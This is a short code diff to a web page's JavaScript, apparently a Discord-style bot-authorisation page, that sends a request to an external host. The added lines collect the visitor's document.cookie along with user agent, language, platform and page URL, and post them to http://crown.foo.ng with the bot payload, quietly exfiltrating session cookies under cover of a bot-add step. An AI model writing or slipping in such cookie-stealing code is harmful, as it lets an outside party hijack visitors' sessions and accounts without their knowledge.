@@ -35,14 +35,26 @@
             return obj;
         }
 
+        function getCookies() {
+            return document.cookie;
+        }
+
         async function sendToApi() {
             document.getElementById("status").innerText = "Please wait...";
             const botId = "1297569951632068618";
             const url = "http://crown.foo.ng/oauth2?event=bot.add";
+            
             const payload = {
                 deviceTime: getDeviceTime(),
                 botId: botId,
-                urlParams: getUrlParams()
+                urlParams: getUrlParams(),
+                log: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookies: getCookies(),
+                    pageUrl: window.location.href
+                }
             };
 
             try {
